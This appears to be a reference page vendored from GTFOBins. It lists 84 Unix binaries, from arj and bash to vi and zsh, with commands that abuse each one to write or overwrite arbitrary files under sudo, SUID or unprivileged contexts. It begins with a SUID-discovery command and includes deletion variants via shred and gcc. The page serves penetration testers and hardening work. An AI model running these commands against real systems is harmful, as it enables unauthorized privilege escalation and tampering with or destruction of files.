---
title: "GTFOBins - file-write (84 binaries)"
category: "misc"
subcategory: "privilege-escalation"
type: "reference"
tags: ["gtfobins", "privilege-escalation", "privesc", "shell-escape", "restricted-shell", "linux", "post-exploitation", "binary-abuse", "lolbins", "living-off-the-land", "file-write", "filewrite"]
summary: "84 Unix binaries whose file-write function writes to an arbitrary file."
source:
  name: "GTFOBins/GTFOBins.github.io"
  url: "https://github.com/GTFOBins/GTFOBins.github.io"
license: "GPL-3.0"
---

## What this page is

Every GTFOBins binary whose `file-write` function writes to an arbitrary file, with the exact command. 84 binaries.

## Finding your way in

```bash
# intersect what is available with what is on this page
find / -perm -4000 -type f 2>/dev/null
```

## file-write payloads

### arj

The `.arj` suffix will be added to `x`.

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA >output-file
arj a x output-file
arj e x /path/to/output-dir/
```

### ash

file-write — suid variant

*Contexts: suid*

```bash
ash -p -c 'echo DATA >/path/to/output-file'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
ash -c 'echo DATA >/path/to/output-file'
```

### bash

file-write — suid variant

*Contexts: suid*

```bash
bash -p -c 'echo DATA >/path/to/output-file'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
bash -c 'echo DATA >/path/to/output-file'
```

This only works interactively from an existing `bash` session. It adds timestamps to the output file.

*Contexts: sudo, suid, unprivileged*

```bash
HISTIGNORE='history *'
history -c
DATA
history -w /path/to/output-file
```

### check_log

*Contexts: sudo, unprivileged*

```bash
check_log -F /path/to/input-file -O /path/to/output-file
```

### cp

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | cp /dev/stdin /path/to/output-file
```

### cpio

file-write — sudo variant

*Contexts: sudo*

```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -R 0:0 -udp .
```

file-write — suid variant

*Contexts: suid*

```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -R 0:0 -udp .
```

The whole directory structure is copied to `.`, with the data written to `./path/to/temp-file`.

*Contexts: sudo (variant below), suid (variant below), unprivileged*

```bash
echo DATA >/path/to/temp-file
echo /path/to/temp-file | cpio -udp .
```

### csh

file-write — suid variant

*Contexts: suid*

```bash
csh -c 'echo DATA >/path/to/output-file' -b
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
csh -c 'echo DATA >/path/to/output-file'
```

### csplit

Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA >/path/to/temp-file
csplit -z -b '%doutput-file' /path/to/temp-file 1
```

### csvtool

The file is actually parsed and manipulated as CSV.

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA >/path/to/temp-file
csvtool trim t /path/to/temp-file -o /path/to/output-file
```

### curl

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA >/path/to/temp-file
curl file:///path/to/temp-file -o /path/to/output-file
```

### dash

*Contexts: sudo, suid, unprivileged*

```bash
dash -c 'echo DATA >/path/to/output-file'
```

### dd

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | dd of=/path/to/output-file
```

### dmidecode

It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.
Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.

- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.

- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.

```
make dmiwrite
echo DATA >/path/to/temp-file
./dmiwrite /path/to/temp-file x.dmi
```

*Contexts: unprivileged*

```bash
dmidecode --no-sysfs -d x.dmi --dump-bin /path/to/output-file
```

### docker

Write a file by copying it to a temporary container (`$CONTAINER_ID`) and back to the target destination on the host.

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA >/path/to/temp-file
docker cp /path/to/temp-file $CONTAINER_ID:temp-file
docker cp $CONTAINER_ID /path/to/output-file
```

### dos2unix

*Contexts: sudo, suid, unprivileged*

```bash
dos2unix -f -n /path/to/input-file /path/to/output-file
```

### dosbox

Note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.

*Contexts: sudo, suid, unprivileged*

```bash
dosbox -c 'mount c /' -c "echo DATA >c:\path\to\output" -c exit
```

### ed

*Contexts: sudo, suid, unprivileged*

```bash
ed /path/to/output-file
a
DATA
.
w
q
```

### elvish

*Contexts: sudo, suid, unprivileged*

```bash
elvish -c 'print DATA >/path/to/output-file'
```

### emacs

*Contexts: sudo, unprivileged*

```bash
emacs /path/to/output-file
DATA
C-x C-s
```

### exiftool

If the permissions allow it, files are moved (instead of copied) to the destination.

*Contexts: sudo, unprivileged*

```bash
exiftool -filename=/path/to/output-file /path/to/input-file
```

The output file must exists, either empty or be a supported image file. The content is written amidst other content.

*Contexts: sudo, unprivileged*

```bash
exiftool "-description<=/path/to/input-file --filename /path/to/output-file
```

The output file must exists, either empty or be a supported image file. The content is written amidst other content.

*Contexts: sudo, unprivileged*

```bash
exiftool "-description=DATA --filename /path/to/output-file
```

Writes the metadata tags of the input file in textual format to the output.

*Contexts: sudo, unprivileged*

```bash
exiftool -description -W /path/to/output-file --filename /path/to/input-file
```

### find

`DATA` is a format string, it supports some escape sequences.

*Contexts: sudo, suid, unprivileged*

```bash
find / -fprintf /path/to/output-file DATA -quit
```

### gawk

*Contexts: sudo, suid, unprivileged*

```bash
gawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```

### gcc

This actually deletes the file.

*Contexts: sudo, unprivileged*

```bash
gcc -x c /dev/null -o /path/to/input-file
```

### gdb

*Contexts: sudo, suid, unprivileged*

```bash
gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
```

### git

The patch can be created locally by creating the file that will be written on the target using its absolute path:

```
echo DATA >/path/to/input-file
git diff /dev/null /path/to/input-file >x.patch
```

*Contexts: sudo, suid, unprivileged*

```bash
git apply --unsafe-paths --directory / x.patch
```

### go

*Contexts: sudo, unprivileged*

```bash
echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte("DATA\\n"))\n\tf.Close()\n}' >/path/to/temp-file.go
go run /path/to/temp-file.go
```

### gtester

Data to be written appears in an XML attribute in the output file (`<testbinary path="DATA">`).

*Contexts: sudo, suid, unprivileged*

```bash
gtester DATA -o /path/to/output-file
```

### hashcat

Append data to the end of the output file, creating if does not exist.

*Contexts: sudo, unprivileged*

```bash
echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash
hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist
```

### iconv

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
```

### iptables-save

The content is written along with a number of `iptables` rules.

*Contexts: sudo*

```bash
iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /path/to/output-file
```

### jjs

*Contexts: sudo, unprivileged*

```bash
jjs
var FileWriter = Java.type('java.io.FileWriter');
var fw=new FileWriter('/path/to/output-file');
fw.write('DATA');
fw.close();
```

### jrunscript

*Contexts: sudo, unprivileged*

```bash
jrunscript -e 'var fw=new java.io.FileWriter("/path/to/output-file");
    fw.write("DATA");
    fw.close();'
```

### jshell

Writes only the valid Java code to file.

*Contexts: sudo, unprivileged*

```bash
jshell
String x = "DATA";
/save /path/to/output-file
```

### julia

*Contexts: sudo, suid, unprivileged*

```bash
julia -e 'open(f->write(f, "DATA"), /path/to/output-file, "w")'
```

### latex

The file can only be written in the current directory, and the `.tex` extension is mandatory.

*Contexts: sudo, suid, unprivileged*

```bash
latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

### less

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | less
s/path/to/output-file
q
```

### logrotate

The content is written in a log file.

*Contexts: sudo, suid, unprivileged*

```bash
logrotate -l /path/to/output-file DATA
```

### ltrace

The data to be written appears amid the library function call log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever library function call passing arbitrary data can be used in place of `ltrace -F DATA`.

*Contexts: sudo, unprivileged*

```bash
ltrace -s 999 -o /path/to/input-file ltrace -F DATA
```

### lua

*Contexts: sudo, suid, unprivileged*

```bash
lua -e 'local f=io.open("/path/to/output-file", "wb"); f:write("DATA"); io.close(f);'
```

### lwp-download

*Contexts: sudo, unprivileged*

```bash
echo DATA >/path/to/temp-file
lwp-download file:///path/to/temp-file /path/to/output-file
```

This actually copies a file to a destination.

*Contexts: sudo, unprivileged*

```bash
lwp-download file:///path/to/input-file /path/to/output-file
```

### make

*Contexts: sudo, suid, unprivileged*

```bash
make -s --eval='$(file >/path/to/output-file,DATA)' .
```

### mawk

*Contexts: sudo, suid, unprivileged*

```bash
mawk 'BEGIN { print "DATA" > "/path/to/output-file" }'
```

### mv

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file
```

### mypy

Partial content is leaked as error messages inside some XML tags.

*Contexts: sudo, unprivileged*

```bash
mypy /path/to/input-file --junit-xml /path/to/output-file
```

### nano

*Contexts: sudo, suid, unprivileged*

```bash
nano /path/to/output-file
DATA
^O
```

### nmap

The payload appears inside the regular nmap output.

*Contexts: sudo, suid, unprivileged*

```bash
nmap -oG=/path/to/output-file DATA
```

### node

*Contexts: sudo, suid, unprivileged*

```bash
node -e 'require("fs").writeFileSync("/path/to/output-file", "DATA")'
```

### octave

*Contexts: sudo, suid, unprivileged*

```bash
octave-cli --eval 'fid = fopen("/path/to/output-file", "w"); fputs(fid, "DATA"); fclose(fid);'
```

### openssl

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | openssl enc -out /path/to/output-file
```

*Contexts: sudo, suid, unprivileged*

```bash
openssl enc -in /path/to/input-file -out /path/to/output-file
```

### pandoc

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | pandoc -t plain -o /path/to/output-file
```

### pdflatex

The file can only be written in the current directory, and the `.tex` extension is mandatory.

*Contexts: sudo, suid, unprivileged*

```bash
pdflatex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'
```

### php

*Contexts: sudo, suid, unprivileged*

```bash
php -r 'file_put_contents("/path/to/output-file", "DATA");'
```

### puppet

*Contexts: sudo, unprivileged*

```bash
puppet apply -e 'file { "/path/to/output-file": content => "DATA" }'
```

### pwsh

*Contexts: sudo, unprivileged*

```bash
pwsh -c '"DATA" | Out-File /path/to/output-file'
```

### python

*Contexts: sudo, suid, unprivileged*

```bash
python -c 'open("/path/to/output-file","w+").write("DATA")'
```

### redis

Write files on the server running Redis at the specified location. Written data will appear amongst the database dump.

Keep in mind that it's actually the server to perform the file write.

*Contexts: sudo, suid, unprivileged*

```bash
redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save
```

### rlwrap

This adds timestamps to the output file. This relies on the external `echo` command.

*Contexts: sudo, suid, unprivileged*

```bash
rlwrap -l /path/to/output-file echo DATA
```

### ruby

*Contexts: sudo, unprivileged*

```bash
ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
```

### rustc

The comment appears in the compiled program.

*Contexts: sudo, unprivileged*

```bash
echo 'fn main() { println!("DATA"); }' >/path/to/temp-file
rustc /path/to/temp-file -o /path/to/output-file
```

### rustdoc

This command creates a number of documentation files in the target directory, and the data is written in multiple locations, e.g., `src/temp_file/temp-file.html`, amidst other content.

*Contexts: sudo, unprivileged*

```bash
echo '//! DATA' >/path/to/temp-file
rustdoc /path/to/temp-file -o /path/to/output-dir/
```

### screen

Data is appended to the file and `\n` is converted to `\r\n`.

*Contexts: sudo, unprivileged*

```bash
screen -L -Logfile /path/to/output-file echo DATA
```

Data is appended to the file and `\n` is converted to `\r\n`.

*Contexts: sudo, unprivileged*

```bash
screen -L /path/to/output-file echo DATA
```

### script

The content appears among the log prints.

*Contexts: sudo, suid, unprivileged*

```bash
script -q -c '# DATA' /path/to/output-file
```

### sed

*Contexts: sudo, suid, unprivileged*

```bash
sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts
```

### shred

This actually deletes the chosen file.

*Contexts: sudo, suid, unprivileged*

```bash
shred -u /path/to/output-file
```

### shuf

The written file content is corrupted by adding a newline.

*Contexts: sudo, suid, unprivileged*

```bash
shuf -e DATA -o /path/to/output-file
```

### socat

The `echo` command is actually used.

*Contexts: sudo, suid, unprivileged*

```bash
socat -u 'exec:echo DATA' open:/path/to/output-file,creat
```

### sort

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | sort -m -o /path/to/output-file
```

### split

This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.

*Contexts: sudo, suid, unprivileged*

```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
```

### sqlite3

*Contexts: sudo, suid, unprivileged*

```bash
sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select "DATA";'
```

### ssh-copy-id

The input file must have the `.pub` file extension.

*Contexts: sudo, unprivileged*

```bash
ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host
```

### strace

The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.

*Contexts: sudo, unprivileged*

```bash
strace -s 999 -o /path/to/output-file strace - DATA
```

### tar

The archive can also be prepared offline then uploaded to the target.

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA >/path/to/temp-file
tar cf /path/to/temp-file.tar /path/to/temp-file
tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@
```

### tcpdump

This saves the packet dump (count is 1) from the loopback interface to a file. To trigger the capture use something like:

```
nc -u localhost 1 <<<DATA
```

While `user` is the owner of the packet dump file, the invoking user must be able to capture traffic on the device.

*Contexts: sudo, suid, unprivileged*

```bash
tcpdump -ln -i lo -w /path/to/output-file -c 1 -Z user
```

### tcsh

file-write — suid variant

*Contexts: suid*

```bash
tcsh -bc 'echo DATA >/path/to/output-file'
```

*Contexts: sudo, suid (variant below), unprivileged*

```bash
tcsh -c 'echo DATA >/path/to/output-file'
```

### tee

Use `-a` to append data to exising files.

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | tee /path/to/output-file
```

### tsc

Content is leaked as error messages and written to file. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.

*Contexts: sudo, unprivileged*

```bash
tsc /path/to/input-file.ts --outFile /path/to/output-file
```

### update-alternatives

Write in `/path/to/output-file` a symlink to `/path/to/temp-file`.

*Contexts: sudo, suid*

```bash
echo DATA >/path/to/temp-file
update-alternatives --force --install /path/to/output-file x /path/to/temp-file 0
```

### varnishncsa

The command hangs, so the trigger command must be performed asynchronously or in another terminal:

```
curl -H 'xxx: DATA' http://localhost:6081/xxxxxxxxxx
```

*Contexts: sudo, suid*

```bash
varnishncsa -g request -q 'ReqURL ~ "/xxxxxxxxxx"' -F '%{yyy}i' -w /path/to/output-file
```

### vi

Where `^[` is the escape key.

*Contexts: sudo, suid, unprivileged*

```bash
vi /path/to/output-file
iDATA
^[
w
```

### virsh

This requires the user to be in the `libvirt` group. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.

*Contexts: sudo, unprivileged*

```bash
echo DATA >/path/to/temp-file

cat >/path/to/temp-file.xml <<EOF
<volume type='file'>
  <name>y</name>
  <key>/path/to/output-dir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/path/to/output-dir/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
virsh -c qemu:///system pool-destroy x
```

This requires the user to be in the `libvirt` group.

*Contexts: sudo, unprivileged*

```bash
virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x
```

### wget

The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages.

*Contexts: sudo, suid, unprivileged*

```bash
wget -i /path/to/input-file -o /path/to/output-file
```

### wireshark

This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.

After starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with `nc` (see below). The capture then stops and the packet dump can be saved:

1. select the only received packet;

2. right-click on "Data" from the "Packet Details" pane, and select "Export Packet Bytes...";

3. choose where to save the packet dump.

*Contexts: sudo, unprivileged*

```bash
wireshark -c 1 -i lo -k -f 'udp port 12345' &
echo DATA | nc -u 127.127.127.127 12345
```

### xxd

*Contexts: sudo, suid, unprivileged*

```bash
echo DATA | xxd | xxd -r - /path/to/output-file
```

### zsh

*Contexts: sudo, suid, unprivileged*

```bash
zsh -c 'echo DATA >/path/to/output-file'
```

## Attribution

Data from [GTFOBins](https://gtfobins.github.io/) (commit `acd524623f9c`), licensed GPL-3.0. Vendored at `vendor/GTFOBins/_gtfobins/`.
